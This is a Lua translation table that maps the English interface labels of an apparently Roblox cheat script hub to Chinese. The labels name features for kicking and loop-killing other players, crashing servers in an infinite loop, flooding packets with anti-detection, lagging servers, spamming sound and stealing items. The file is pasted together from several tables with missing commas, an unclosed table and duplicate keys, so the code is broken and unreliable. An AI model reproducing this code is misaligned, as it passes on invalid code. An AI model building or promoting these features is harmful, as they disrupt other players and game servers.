--我发给ai给文本汉化一下结果卡死了
--只能这样了

local Translations = {
    ["Me(=^・^=)"] = "个人设置",
    ["GUI"] = "界面设置",
    ["Anti"] = "防御",
    ["Attack"] = "攻击",
    ["Server Manager"] = "滚木",
    ["Hijack Train"] = "火车",
    ["Sheet Music"] = "自动弹琴",
    ["SRBM"] = "玩具",
    ["CN_BX"] = "BX汉化",
    ["Info & Support"] = "信息与支持",
    ["Interface Hidden"] = "界面已隐藏",
    ["Tap K to reopen the interface"] = "按 K 键重新打开界面",

    ["Movement Features"] = "移动功能",
    ["Infinite Jump"] = "无限跳跃",
    ["Noclip"] = "穿墙",
    ["TPWalk"] = "行走",
    ["TPWalk Speed"] = "行走速度",
    ["Visual Features"] = "视觉功能",
    ["ESP"] = "透视",
    ["Third Person View"] = "第三人称视角",
    ["FOV"] = "视野范围",
    ["Reset FOV"] = "重置视野",
    ["Control"] = "控制",
    ["Stop All Features"] = "停止所有功能",
    
    ["Refresh Player List"] = "刷新玩家列表",
    ["Drift Kick V2"] = "漂移踢 V2（翻译就这样）",
    ["Send Flying"] = "甩飞",
    ["Select Player"] = "选择玩家",
    ["Send Flying!"] = "执行甩飞9191",
    ["Send Flying Additional Features"] = "击飞附加功能",
    ["Kick All"] = "踢出所有人",
    ["Exclude Friends"] = "排除好友",
    ["Status"] = "状态",
    ["Current state information"] = "当前状态信息",
    ["Current Target V1: None"] = "当前目标 V1: 无",
    ["Status V1: Stopped"] = "状态 V1: 已停止",
    ["Sphere Orbit Kick V1"] = "球形环绕踢 V1",
    ["Target Player"] = "目标玩家",
    ["Execute (Sphere Orbit Kick)"] = "执行 (球形环绕踢)",
    ["Stop"] = "停止",
    ["Orbit Radius"] = "环绕半径",
    ["Orbit Speed"] = "环绕速度",
    ["Float Height"] = "漂浮高度",
    ["Sphere Tilt"] = "球体倾斜",
    ["Orbit Complexity"] = "环绕复杂度",
    ["Show Effects"] = "显示特效",
    ["Description"] = "描述",
    ["Rapidly rotates in a 3D spherical orbit around the target, delivering a powerful drift kick. Rotates 360 degrees in all X, Y, Z directions."] = "围绕目标进行 3D 球形快速旋转，并造成强力的漂移踢。在 X、Y、Z 轴上 360 度旋转。",
    ["Warning!"] = "警告！",
    ["Do NOT abuse!"] = "请勿滥用！",
    ["Kick V1 (Blob Grab)"] = "踢人 V1 (史莱姆抓取)",
    ["Loop Kick V1 (Grab + Blob)"] = "循环踢人 V1 (抓取 + 史莱姆)",
    ["Kick V2 (Orbit & Grab)"] = "踢人 V2 (环绕 & 抓取)",
    ["Select Target"] = "选择目标",

    ["⚠ Do not abuse"] = "⚠ 请勿滥用（我是给）",
    ["Test feature for server owners."] = "供服务器所有者测试的功能。",
    ["Do not run on other people's servers."] = "请勿在他人的服务器上运行。",
    ["Test Execution"] = "测试执行",
    ["Server Crash Test (standalone, 35 consecutive runs)"] = "服务器崩溃测试 (单次，连续35次)",
    ["Auto Crash Mode (infinite loop)"] = "自动崩溃模式 (无限循环)",
    ["Information"] = "信息",
    ["Usage"] = "用法",
    ["URLs Used"] = "使用的网址",
    ["Notes"] = "注意事项",

    ["Seat Operations"] = "座位操作",
    ["Sit on Random Empty Seat"] = "随机坐在空座位上",
    ["Automation Settings"] = "自动化设置",
    ["Enable Automation"] = "启用自动化",
    ["Automation Behavior"] = "自动化行为",
    ["On board/alight: Spawn -> Hold -> Use -> Discard"] = "上车/下车: 生成 -> 持有 -> 使用 -> 丢弃",
    ["PC Useful Features"] = "PC 实用功能",
    ["Launch vFly GUI"] = "启动 vFly 界面",
    ["vFly GUI"] = "vFly 界面",
    ["WASD+QE flight, includes Noclip feature."] = "WASD+QE 飞行，包含穿墙功能。",

    ["Piano Control"] = "钢琴控制",
    ["Enable Piano Feature"] = "启用钢琴功能",
    ["Follow Player"] = "跟随玩家",
    ["Default Songs"] = "默认歌曲",
    ["Select a song to play"] = "选择要弹奏的歌曲",
    ["Play Girl A (少女A)"] = "播放少女A",
    ["Play 공격이다 (It's an Attack)"] = "播放 공격이다 (It's an Attack)",
    ["Play MONTAGEM_HIKARI"] = "播放 MONTAGEM_HIKARI",
    ["Stop Playing"] = "停止播放",
    ["Play Song (Text Input)"] = "播放歌曲 (文本输入)",
    ["Enter JSON Data"] = "输入 JSON 数据",
    ["Input"] = "输入",
    ["Play Entered Song"] = "播放输入的歌曲",
    ["MIDI -> JSON Converter"] = "MIDI -> JSON 转换器",
    ["Open Converter (Browser)"] = "打开转换器 (浏览器)",
    ["Copy URL"] = "复制链接",
    ["How to Use"] = "如何使用",
    ["Supported range: C4 to C6 (2 octaves)"] = "支持范围: C4 到 C6 (2个八度)",
    ["1. Open the MIDI -> JSON conversion page with 'Open Converter'"] = "1. 点击 '打开转换器' 打开网页",
    ["2. Upload a MIDI file and convert"] = "2. 上传 MIDI 文件并转换",
    ["3. Copy the generated JSON"] = "3. 复制生成的 JSON 代码",
    ["4. Paste into 'Enter JSON Data' above and play"] = "4. 粘贴到上方的 '输入 JSON 数据' 中并播放",

    ["Note"] = "注意",
    ["SRBM features can only obtain your own objects!"] = "SRBM 功能只能获取你自己的物品！",
    ["HUD Display"] = "HUD 显示",
    ["HUD Display (Image + Coords)"] = "HUD 显示 (图片 + 坐标)",
    ["Toggle Visibility with P Key (Info)"] = "按 P 键切换可见性 (信息)",
    ["ICBM"] = "洲际导弹",
    ["Third Person"] = "第三人称",
    ["Helicopter Control"] = "直升机控制",
    ["Toy Mode"] = "玩具模式",
    ["Load Resource Pack"] = "加载资源包",
    ["Resource Pack V1"] = "资源包 V1",
    ["Replaces the appearance of TractorGreen with another model."] = "将绿色拖拉机的外观替换为其他模型。",
    ["Script Hub"] = "脚本中心",
    ["⚠ Note"] = "⚠ 注意",
    ["Some external scripts are developed outside Sakura Hub. No guarantee."] = "部分外部脚本在樱花Hub之外开发，不保证安全性。",
    ["Load External Scripts"] = "加载外部脚本",
    ["Shader"] = "光影着色器",
    ["Shader 2"] = "光影着色器 2",
    ["Sky Change"] = "改变天空",
    ["Tetris"] = "俄罗斯方块",
    ["Kurosuke's V-Style Flight"] = "黑助的 V型飞行",
    ["HokutoHUB"] = "北斗脚本库",
    ["Backrooms"] = "后室",
    ["Translate UI to Japanese"] = "将界面翻译为日语",
    ["FTAP TP"] = "点击传送",
    ["All Object IDs (28 types):"] = "所有物品 ID (28种):",
    ["Supported objects: 28 types"] = "支持的物品: 28种",
    ["Barrier Break"] = "破坏屏障",
    ["Barrier Break Feature"] = "屏障破坏功能",
    ["Barrier Break (BETA)"] = "破坏屏障 (测试版)",

    ["Activate Feather"] = "激活羽毛翅膀",
    ["Max Object Count"] = "最大物品数量",
    ["Object Spacing"] = "物品间距",
    ["Height Offset"] = "高度偏移",
    ["Back Offset"] = "后方偏移",
    ["Tilt Angle"] = "倾斜角度",
    ["Wave Speed"] = "波浪速度",
    ["Base Amplitude"] = "基础振幅",
    ["Activate Wing V2"] = "激活翅膀 V2",
    ["Wing Height Position"] = "翅膀高度位置",
    ["Wing Spread"] = "翅膀展开程度",
    ["Flap Shape"] = "扇动形状",
    ["Flap Speed"] = "扇动速度",
    ["Flap Range"] = "扇动范围",
    ["Objects per Wing"] = "每侧翅膀物品数",
    ["Chain Delay"] = "链接延迟",
    ["Saturn-Type Sparkler Controller"] = "土星型烟花控制器",
    ["Enable"] = "启用",
    ["Placement Mode"] = "放置模式",
    ["Base Height"] = "基础高度",
    ["Follow Speed"] = "跟随速度",
    ["Ring Settings"] = "圆环设置",
    ["Ring Radius"] = "圆环半径",
    ["Ring Speed"] = "圆环速度",
    ["Sphere Settings"] = "球体设置",
    ["Sphere Radius"] = "球体半径",
    ["Sphere Speed"] = "球体速度",
    ["Sphere Layer Count"] = "球体层数",
    ["Plot Settings"] = "绘图设置",
    ["Plot Spread Radius"] = "绘图扩散半径",
    ["Rescan"] = "重新扫描",
    ["Activate Magic Circle"] = "激活魔法阵",
    ["Symbol Type"] = "符号类型",
    ["Glow Effect"] = "发光特效",
    ["Height"] = "高度",
    ["Diameter"] = "直径",
    ["Object Count"] = "物品数量",
    ["Rotation Speed"] = "旋转速度",
    ["Basic Settings"] = "基础设置",
    ["Activate Tornado Toy MOD"] = "激活龙卷风玩具 MOD",
    ["Tornado Effect (Spiral)"] = "龙卷风特效 (螺旋)",
    ["Size Settings"] = "大小设置",
    ["Base Radius"] = "基础半径",
    ["Total Height"] = "总高度",
    ["Firework Count"] = "烟花数量",
    ["Motion Settings"] = "运动设置",
    ["Spiral Speed"] = "螺旋速度",
    ["Wave Amplitude"] = "波浪振幅",
    ["Redetect Fireworks"] = "重新检测烟花",
    ["Activate Ferris Wheel"] = "激活摩天轮",
    ["Vertical Circle"] = "垂直圆环",
    ["Use Fixed Direction"] = "使用固定方向",
    ["Fixed Yaw"] = "固定偏航角 (左右)",
    ["Fixed Pitch"] = "固定俯仰角 (上下)",
    ["Fixed Roll"] = "固定翻滚角 (侧翻)",
    ["Radius"] = "半径",
    ["Center Height"] = "中心高度",
    ["Activate Heart"] = "激活爱心",
    ["Heart Size"] = "爱心大小",
    ["Pulse Speed"] = "脉冲速度",
    ["Pulse Amplitude"] = "脉冲振幅",

    ["Defense Features"] = "防御功能",
    ["Escape When Grabbed (Simple)"] = "被抓时逃脱 (简单版)",
    ["Anti Grab V2 (Enhanced)"] = "防抓取 V2 (增强版)",
    ["Escape When Grabbed (Simple): Struggle spam + Anchor"] = "简单版：疯狂挣扎 + 锚定",
    ["Anti Grab V2 (Enhanced): Collision off + Ragdoll release + Physics lock"] = "增强版：关闭碰撞 + 解除布娃娃 + 物理锁定",
    ["Anti Gucci"] = "防Gucci控制",
    ["Anti Void"] = "防虚空",
    ["Anti Void prevents falling into the void"] = "防虚空可防止掉入虚空死亡",
    ["Fix GUI"] = "修复界面",
    ["TP GUI"] = "传送界面",
    ["TTP GUI"] = "点击传送界面",
    ["Keyboard GUI"] = "键盘界面",

    ["Official Links (Press button to copy URL)"] = "官方链接 (点击复制网址)",
    ["Developer [Saturn Group] Official Site"] = "开发者 [土星集团] 官方网站",
    ["Sakurahub Official Site"] = "樱花Hub官方网站",
    ["Sakurahub Related Repo 1 (Sakura-Hub-main)"] = "樱花Hub相关仓库 1 (Sakura-Hub-main)",
    ["Sakurahub Related Repo 2 (Sakurahub-ja-en-vn-123-)"] = "樱花Hub相关仓库 2 (Sakurahub-ja-en-vn-123-)",
    ["Sakurahub Related Repo 3 (Sakurahub-SabuHUB)"] = "樱花Hub相关仓库 3 (Sakurahub-SabuHUB)",
    ["Sakurahub Related Repo 4 (Sakurahub-beta)"] = "樱花Hub相关仓库 4 (Sakurahub-beta)",
    ["Support Server"] = "支持服务器",
    ["Join Support Server [Discord Global]"] = "加入支持服务器 [Discord 全球]",
    ["Join Support Server [LINE Open Chat Japan Only]"] = "加入支持服务器 [LINE 仅限日本]",
    ["URL Copied"] = "网址已复制",
    ["'s URL copied to clipboard"] = "的网址已复制到剪贴板",
    ["Details"] = "详细信息",
    ["Version: V0.7.2.140"] = "版本: V0.7.2.140",
    ["Development Group: 土星グループ"] = "开发团队: 土星集团",
    ["Developers List (Press button to copy URL)"] = "开发者列表 (点击复制网址)",

    ["N1: Chaos Circle"] = "N1: 混沌之环",
    ["Activate N1"] = "激活 N1",
    ["Pulse Amount"] = "脉冲量",
    ["Jitter Speed"] = "抖动速度",
    ["Jitter Amount"] = "抖动幅度",
    
    ["N2: Tornado Spiral"] = "N2: 龙卷风螺旋",
    ["Activate N2"] = "激活 N2",
    ["Max Height"] = "最大高度",
    ["Rise Speed"] = "上升速度",
    ["Chaos Factor"] = "混沌系数",

    ["N3: Hyper Explosion"] = "N3: 超级爆炸",
    ["Activate N3"] = "激活 N3",
    ["Explosion Radius"] = "爆炸半径",
    ["Cycle Speed"] = "循环速度",
    ["Randomness"] = "随机度",

    ["Sphere"] = "球体",
    ["Activate Sphere"] = "激活球体",
    ["Latitude Lines"] = "纬度线",
    ["Longitude Lines"] = "经度线",
    ["Horizontal Rotation Speed"] = "水平旋转速度",
    ["Vertical Rotation Speed"] = "垂直旋转速度",

    ["Star of David"] = "六芒星",
    ["Activate Star of David"] = "激活六芒星",
    ["Star Size"] = "星星大小",
    ["Triangle Height"] = "三角形高度",

    ["Star"] = "星星",
    ["Activate Star"] = "激活星星",
    ["Outer Radius"] = "外半径",
    ["Inner Radius"] = "内半径",
    ["Twinkle Speed"] = "闪烁速度",

    ["Star2"] = "星星2",
    ["Activate Star2"] = "激活星星2",
    ["Base Size"] = "基础大小",
    ["Ray Length"] = "射线长度",
    ["Ray Count"] = "射线数量",

    ["卍 (Manji)"] = "卍 (万字符)",
    ["卍 (Both directions)"] = "卍 (双向)",
    ["Manji Size"] = "卍大小",
    ["Drawing Speed"] = "绘制速度",
    ["Rescan Sparklers"] = "重新扫描烟花",
    ["1. Place at least 2 FireworkSparklers"] = "1. 至少放置2个烟花",
    ["2. Toggle ON to draw 卍"] = "2. 开启以绘制卍",
    ["3. Size and speed are adjustable"] = "3. 大小和速度可调",

    ["Vertical Big"] = "垂直大爱心",
    ["Activate Vertical Big"] = "激活垂直大爱心",
    ["Scale Factor"] = "缩放比例",
    ["Vertical Stretch"] = "垂直拉伸",
    ["Big"] = "大爱心",
    ["Activate Big Heart"] = "激活大爱心",
    ["Activate Vertical Heart"] = "激活垂直爱心"
        ["Main"] = "主页", ["Defense"] = "防御", ["Targets"] = "目标", ["Poses"] = "姿势", ["Auras"] = "光环",
    ["Toys"] = "玩具", ["Visuals"] = "视觉", ["Keybinds"] = "按键", ["Server"] = "服务器", ["Settings"] = "设置",
    ["LocalPlayer and Grabfine Settings"] = "本地玩家与抓取设置", ["Last Grabber"] = "最后抓取者", ["Session Time"] = "会话时间",
    ["WalkSpeed"] = "移速", ["JumpPower"] = "跳跃力", ["Fly Speed"] = "飞行速度", ["Infinite Jump"] = "无限跳跃",
    ["Noclip"] = "穿墙", ["Anti Fling"] = "防甩飞", ["Clear Inventory"] = "清空背包", ["Grab Mods"] = "抓取修改",
    ["Line Settings"] = "连线设置", ["Throw Power"] = "投掷力度", ["Use Power [PC Only]"] = "使用力度 [仅电脑]",
    ["Infinite Extend [PC Only]"] = "无限延伸 [仅电脑]", ["Farther Reach"] = "更远距离", ["Kill Grab"] = "击杀抓取",
    ["Massless Grab"] = "无质量抓取", ["Ragdoll Grab"] = "布娃娃抓取", ["Noclip Grab"] = "穿墙抓取",
    ["Kick Grab"] = "踢出抓取", ["Anchor Grab"] = "锚定抓取", ["Auto Repair"] = "自动修复",
    ["Anchor Toy"] = "锚定玩具", ["Remove Anchor"] = "移除锚定", ["Remove Anchor For All Toys"] = "移除所有玩具锚定",
    ["Animations"] = "动画", ["Select Animation"] = "选择动画", ["Animation Speed"] = "动画速度", ["Apply Animation"] = "应用动画",
    ["Discord Server"] = "Discord服务器", ["Copy Link"] = "复制链接", ["Invisible Line"] = "隐形连线",
    ["Line Texture"] = "连线材质", ["Line Sounds"] = "连线音效", ["Arm"] = "手臂", ["Right Arm"] = "右臂", ["Realistic Line"] = "真实连线",
    ["Defend Yourself and Whitlisted Players"] = "保护自己和白名单玩家", ["Main Defense"] = "主防御", ["Anti Grab Mode"] = "防抓模式",
    ["Ragdoll"] = "布娃娃", ["Anti Grab"] = "防抓", ["Anti Blob"] = "防雪人", ["Anti Burn"] = "防燃烧",
    ["Anti Explode"] = "防爆炸", ["Anti Snowball"] = "防雪球", ["Anti Void"] = "防虚空", ["Anti Poison & Paint & Sticky"] = "防毒/油漆/粘性",
    ["Anti Sticky (WD)"] = "防粘性(WD)", ["Anti Banana"] = "防香蕉", ["Anti Lag"] = "防卡顿", ["Auto Anti Lag"] = "自动防卡顿",
    ["Gucci [Anti Grab]"] = "Gucci [防抓]", ["Gucci Method"] = "Gucci方式", ["Toggles"] = "开关", ["Anti Kick"] = "防踢",
    ["Break PCLD"] = "破坏PCLD", ["Auto Reset"] = "自动重置", ["Auto Leave"] = "自动离开",
    ["Anti Kick Item"] = "防踢物品", ["NinjaShuriken"] = "忍者飞镖", ["Rotation X"] = "旋转X", ["Rotation Y"] = "旋转Y",
    ["Rotation Z"] = "旋转Z", ["Offset X"] = "偏移X", ["Offset Y"] = "偏移Y", ["Offset Z"] = "偏移Z",
    ["Auto Leave Sensitivity"] = "自动离开灵敏度", ["Warns"] = "警告", ["Anti Network"] = "防网络", ["Anti Network Item"] = "防网络物品",
    ["Anti Network Delay"] = "防网络延迟", ["Value less than 0.05 may cause ping problems!"] = "低于0.05可能导致高延迟！",
    ["Misc"] = "杂项", ["Select Spawn Point"] = "选择重生点", ["Owned Plot"] = "拥有的地盘", ["Custom Spawn Point"] = "自定义重生点",
    ["TP Places"] = "传送地点", ["Map"] = "地图", ["Loop TP"] = "循环传送", ["FoodHamburger"] = "食物汉堡",
    ["Target or Whitelist Players"] = "目标或白名单玩家", ["Target List"] = "目标列表", ["Select Targets"] = "选择目标",
    ["Auto Line Lag"] = "自动卡线", ["Add To Target List"] = "添加到目标列表", ["View Target"] = "查看目标",
    ["TP To Target"] = "传送至目标", ["Clear Target List"] = "清空目标列表", ["Whitelist"] = "白名单",
    ["Select Players"] = "选择玩家", ["Auto Whitelist Friends"] = "自动白名单好友", ["Add Whitelisted Player"] = "添加白名单玩家",
    ["Clear Whitelist"] = "清空白名单", ["Non Blobman"] = "非雪人", ["Blobman"] = "雪人",
    ["Loop Method"] = "循环方式", ["Kick [Faster]"] = "踢出 [更快]", ["Kick [Loop]"] = "踢出 [循环]", ["Targets Height"] = "目标高度",
    ["Loop Target"] = "循环目标", ["Interaction"] = "交互", ["Target Toys"] = "目标玩具", ["Ragdoll Target"] = "布娃娃目标",
    ["Banana Ragdoll"] = "香蕉布娃娃", ["Explode Item"] = "爆炸物品", ["Loop Explode"] = "循环爆炸",
    ["Loop Snowball"] = "循环雪球", ["Ragdoll Kill [Pencii]"] = "布娃娃击杀 [Pencii]", ["Steal Anti Kick"] = "偷取防踢",
    ["Steal Mode"] = "偷取模式", ["Hold"] = "按住", ["Steal Holdables"] = "偷取可持有物", ["Break Gucci"] = "破坏Gucci",
    ["Make and Pose Players"] = "制作与摆姿势", ["Player"] = "玩家", ["Select Player"] = "选择玩家",
    ["HeadSit"] = "头坐", ["Use Clone"] = "使用克隆", ["Apply Pose"] = "应用姿势", ["Body Parts"] = "身体部位",
    ["Head"] = "头部", ["Head Rot X"] = "头部旋转X", ["Head Rot Y"] = "头部旋转Y", ["Head Rot Z"] = "头部旋转Z",
    ["Head Offset X"] = "头部偏移X", ["Head Offset Y"] = "头部偏移Y", ["Head Offset Z"] = "头部偏移Z",
    ["Interact With Nearby Objects and Players"] = "与附近物体和玩家交互", ["Players Aura"] = "玩家光环", ["Grab Aura Mode"] = "抓取光环模式",
    ["Fling"] = "甩飞", ["Grab Aura"] = "抓取光环", ["Banana Aura"] = "香蕉光环", ["Extinguish Aura"] = "灭火光环",
    ["Toys Aura"] = "玩具光环", ["Toys Aura Mode"] = "玩具光环模式", ["Blobman Auras"] = "雪人光环",
    ["Blobman Aura Mode"] = "雪人光环模式", ["Kick"] = "踢出", ["Blobman Aura"] = "雪人光环", ["Aura Settings"] = "光环设置",
    ["Aura Radius"] = "光环半径", ["Fling Mode Power"] = "甩飞力度", ["Heaven Mode Power"] = "天堂力度",
    ["Players WalkSpeed"] = "玩家移速", ["Players JumpPower"] = "玩家跳跃力",
    ["Interaction With Toys"] = "与玩具交互", ["Toggle"] = "开关", ["Sound Link"] = "声音链接",
    ["Link Here..."] = "在此输入链接...", ["Volume"] = "音量", ["Boombox"] = "音响", ["Auto Play"] = "自动播放",
    ["ESP, Camera and Map Settings"] = "透视、视角与地图设置", ["ESP Toys"] = "玩具透视", ["Sticky Items ESP"] = "粘性物品透视",
    ["Your Sticky Items Color"] = "自己的粘性物颜色", ["Sticky Items Color"] = "粘性物颜色", ["House Sticky Items Color"] = "房子粘性物颜色",
    ["Blobman ESP"] = "雪人透视", ["Your Blobman ESP Color"] = "自己的雪人透视颜色", ["Blobman ESP Color"] = "雪人透视颜色",
    ["House Blobman ESP Color"] = "房子雪人透视颜色", ["Camera"] = "视角", ["Unlock Third Person"] = "解锁第三人称",
    ["Disable Ragdoll Blur"] = "禁用布娃娃模糊", ["First Person Body Parts"] = "第一人称身体部件", ["FOV"] = "视野",
    ["PCLD"] = "PCLD透视", ["PCLD View"] = "PCLD视角", ["SelectionBox"] = "选择框", ["Transparency"] = "透明度",
    ["ESP Players"] = "玩家透视", ["Players ESP"] = "玩家透视开关", ["Name"] = "名字", ["Trace"] = "追踪线",
    ["Player Color"] = "玩家颜色", ["Target Color"] = "目标颜色", ["Whitelisted Color"] = "白名单颜色",
    ["Blackhole"] = "黑洞", ["Notify Sound"] = "提示音", ["No Sound"] = "无声音", ["Notify Time"] = "提示时间",
    ["Kick Notify"] = "踢出提示", ["Blackhole Highlight"] = "黑洞高亮", ["Blackhole Name"] = "黑洞名字", ["Blackhole Trace"] = "黑洞追踪",
    ["Hole Color And Transparency"] = "洞口颜色与透明度", ["Blackhole Image"] = "黑洞图片", ["Image Link Here..."] = "图片链接在此...",
    ["Blackhole Image Color"] = "黑洞图片颜色", ["Enable Custom Image"] = "启用自定义图片",
    ["Enable Shaders"] = "启用光影", ["Water Walk"] = "水上行走", ["Hide Map Props"] = "隐藏地图道具",
    ["Gravity"] = "重力", ["Grass Color"] = "草地颜色", ["LushGrass Color"] = "茂盛草地颜色", ["WasteGrass Color"] = "废弃草地颜色",
    ["Rock Color"] = "岩石颜色", ["Sand Color"] = "沙子颜色", ["Dirt Color"] = "泥土颜色", ["Snow Color"] = "雪地颜色",
    ["Reset Colors"] = "重置颜色", ["Game Sounds"] = "游戏声音", ["Ambience"] = "环境音", ["Explosions"] = "爆炸声", ["Screams"] = "尖叫声",
    ["Bind Teleport and Other Functions"] = "绑定传送和其他功能", ["Teleports"] = "传送", ["Spawn"] = "出生点",
    ["Plot 1"] = "地盘 1", ["Plot 2"] = "地盘 2", ["Plot 3"] = "地盘 3", ["Plot 4"] = "地盘 4", ["Plot 5"] = "地盘 5",
    ["Barn"] = "谷仓", ["House"] = "房子", ["Island"] = "岛屿", ["Void Platform"] = "虚空平台", ["To Mouse"] = "到鼠标位置",
    ["Mobile Buttons"] = "手机按键", ["Binds"] = "绑定", ["Functions"] = "功能", ["Toggle UI"] = "开关界面",
    ["Jerk Off"] = "摆烂动作", ["Spawn And Sit Blob"] = "生成并坐雪人", ["Launch Rocket"] = "发射火箭", ["Zoom"] = "缩放",
    ["Struggle"] = "挣扎", ["Bring"] = "拉取", ["Delete Limbs"] = "删除肢体", ["Which Limbs Need To Delete"] = "需要删除哪个肢体",
    ["All"] = "全部", ["Delete Libms"] = "删除肢体", 
    ["Interaction and Server Lag"] = "交互与服务器卡顿", ["Server Info"] = "服务器信息", ["Players"] = "玩家",
    ["Total Kicks"] = "总踢出数", ["Find Cheaters"] = "寻找作弊者", ["Rejoin"] = "重新加入",
    ["Slots"] = "转盘", ["Time Left"] = "剩余时间", ["Auto Spin Slots"] = "自动转转盘",
    ["Plots"] = "地盘", ["Barrier Status"] = "屏障状态", ["Working"] = "工作中", ["Broken"] = "已破坏",
    ["Break Barrier"] = "破坏屏障", ["Select Plots"] = "选择地盘", ["Break Area"] = "破坏区域",
    ["Methods"] = "方式", ["Loop All"] = "循环全部", ["Kick All"] = "踢出全部", ["Steal All Holdables"] = "偷取所有可持有物",
    ["Sync All"] = "同步全部", ["Banana All"] = "香蕉全部", ["Auto Explode Bombs"] = "自动引爆炸弹", ["Delete Train"] = "删除火车",
    ["Lags"] = "卡顿", ["Packets"] = "数据包", ["Packet Args"] = "数据包参数", ["Packet Amount"] = "数据包数量",
    ["Send Interval"] = "发送间隔", ["Packet Size"] = "数据包大小", ["Anti Detect"] = "防检测", ["Send Packets"] = "发送数据包",
    ["Send Packet"] = "发送数据包", ["Detect Packets"] = "检测数据包", ["Lines"] = "线", ["Line Lag"] = "卡线",
    ["Interval"] = "间隔", ["Crazy Line"] = "疯狂连线", ["Detect Line Lag"] = "检测卡线", ["Shurikens Count"] = "飞镖数量",
    ["Keep Shurikens"] = "保留飞镖", ["Stick All [Lag]"] = "粘住全部 [卡顿]",
    ["Sound Spam Interval"] = "声音轰炸间隔", ["Sound Spam"] = "声音轰炸", ["Enabling this feature may make it difficult to view chat logs!"] = "启用此功能可能导致无法查看聊天记录！",
    ["Map Objects"] = "地图物件", ["Selected Parts"] = "选中部件", ["Break Mode"] = "破坏模式", ["Selected Parts Color"] = "选中部件颜色",
    ["Break Part"] = "破坏部件", ["Fix All"] = "修复全部", ["Flood"] = "洪水", ["Select Object"] = "选择物体",
    ["CaveCart"] = "矿车", ["Break Object"] = "破坏物体", ["If objects don't fall, try kick all, and massless grab should also be enabled!"] = "如果物体不掉落，请尝试全部踢出，且应开启无质量抓取！",
    ["UI and Config"] = "界面与配置", ["UI Settings"] = "界面设置", ["Corner Radius"] = "圆角半径", ["Lock Mouse"] = "锁定鼠标",
    ["Background"] = "背景", ["Image"] = "图片", ["Import"] = "导入", ["Export"] = "导出", ["File Name"] = "文件名",
    ["Json"] = "Json数据", ["Json Here..."] = "在此输入Json...", ["Create Config"] = "创建配置", ["Configuration"] = "配置",
    ["Config name"] = "配置名称", ["Create config"] = "创建配置", ["Config list"] = "配置列表", ["Load config"] = "加载配置",
    ["Overwrite config"] = "覆盖配置", ["Delete config"] = "删除配置", ["Refresh list"] = "刷新列表", ["Set as autoload"] = "设为自动加载",
    ["Reset autoload"] = "重置自动加载", ["Current autoload config: none"] = "当前自动加载配置：无",
    ["Themes"] = "主题", ["Background color"] = "背景颜色", ["Main color"] = "主色调", ["Accent color"] = "强调色",
    ["Outline color"] = "轮廓颜色", ["Font color"] = "字体颜色", ["Font Face"] = "字体样式", ["Code"] = "代码",
    ["Theme list"] = "主题列表", ["Default"] = "默认", ["Set as default"] = "设为默认", ["Custom theme name"] = "自定义主题名称",
    ["Create theme"] = "创建主题", ["Custom themes"] = "自定义主题", ["Load theme"] = "加载主题", ["Overwrite theme"] = "覆盖主题",
    ["Delete theme"] = "删除主题", ["Reset default"] = "恢复默认",
    ["Search"] = "搜索", ["Lock"] = "锁定", ["None"] = "无", ["Drag"] = "拖拽"    ["Global Chat"] = "全局聊天",
    ["Home"] = "主页",
    ["Player"] = "玩家",
    ["Grab"] = "抓取",
    ["Misc"] = "杂项",
    ["Settings"] = "设置",
    ["Exit"] = "退出",
    ["Blobman"] = "布洛布曼",
    ["Tornado"] = "龙卷风",
    ["Auto build"] = "自动建造",
    ["Way points"] = "路径点",
    ["Lighting"] = "光照",
    ["Physics"] = "物理",
    ["About"] = "关于",
    
    ["Apply zero gravity to nearby objects (30 seconds)"] = "附近物体失重 (30秒)",
    ["Fling nearby objects"] = "甩飞附近物体",
    ["Spin nearby objects"] = "旋转附近物体",
    ["Summon missile rain (troll)"] = "召唤导弹雨 (恶搞)",
    ["Target only players (missile rain)"] = "仅瞄准玩家 (导弹雨)",
    ["Use slot machine"] = "使用老虎机",
    ["Anti-Fling"] = "防甩飞",
    
    ["Grabbing Part: nil"] = "抓取部位: 无",
    ["Super strength"] = "超级力量",
    ["Strength multiplier"] = "力量倍数",
    ["Infinite grab line"] = "无限抓取线",
    ["Scrolling speed (Infinite grab line)"] = "滚动速度 (无限抓取线)",
    ["Zero gravity (30 seconds, works only on objects)"] = "零重力 (30秒, 仅限物体)",
    ["Spin grab (works only on objects)"] = "旋转抓取 (仅限物体)",
    ["Uncollision grab"] = "无碰撞抓取",
    ["Animal grab"] = "抓取动物",
    ["Animal walk speed"] = "动物移动速度",
    ["Clear all animals"] = "清除所有动物",
    ["Anchored grabbed object (hotkey)"] = "固定抓取物体 (快捷键)",
    ["Anchored grabbed object"] = "固定抓取物体",
    ["Repair all anchor objects"] = "修复所有固定物体",
    ["UnAnchor all objs"] = "取消固定所有物体",
    ["Filter grabbing object (hotkey)"] = "过滤抓取物体 (快捷键)",
    ["Filter grabbed object"] = "过滤抓取物体",
    ["Clear fitter"] = "清除过滤",
    
    ["Anti-grab"] = "防抓取",
    ["Revenge grab (The person who grabs you)"] = "复仇抓取 (抓你的人)",
    ["Notify the target of retaliation"] = "通知报复目标",
    ["Select player"] = "选择玩家",
    ["Select a player"] = "选择一个玩家",
    ["TP to player"] = "传送到玩家",
    ["TP offset"] = "传送偏移",
    ["Throw vertical offset"] = "投掷垂直偏移",
    ["Throw force"] = "投掷力度",
    ["Throw nearby items to the player"] = "将附近物品投掷给玩家",
    ["Loop kill"] = "循环击杀",
    ["Anti-burn"] = "防烧伤",
    ["Anti-void"] = "防虚空",
    ["Anti-explode"] = "防爆炸",
    ["Disable effect (onscreen)"] = "禁用屏幕效果",
    ["Jumppower (Default 24)"] = "跳跃力 (默认24)",
    ["Right-ctrl + click to TP"] = "右Ctrl+点击传送",
    ["Kill player"] = "击杀玩家",
    ["Throw balloons over the player's heads (troll)"] = "玩家头上扔气球 (恶搞)",
    ["Throw balloons over the random player's heads (troll)"] = "随机玩家头上扔气球 (恶搞)",
    ["Throw missile over the player's heads (troll)"] = "玩家头上扔导弹 (恶搞)",
    ["Throw missile over the random player's heads (troll)"] = "随机玩家头上扔导弹 (恶搞)",
    ["Let the player burn (troll)"] = "让玩家燃烧 (恶搞)",
    ["Let all players burn (troll)"] = "让所有玩家燃烧 (恶搞)",
    ["Throw horizontal offset"] = "投掷水平偏移",
    
    ["Physical prediction (visualization)"] = "物理预测 (可视化)",
    ["Ignore self"] = "忽略自己",
    ["Upper limit of prediction"] = "预测上限",
    
    ["Time"] = "时间",
    ["Init realistic lighting"] = "初始化真实光照",
    
    ["Select waypoint"] = "选择路径点",
    ["Select..."] = "选择...",
    ["Teleport"] = "传送",
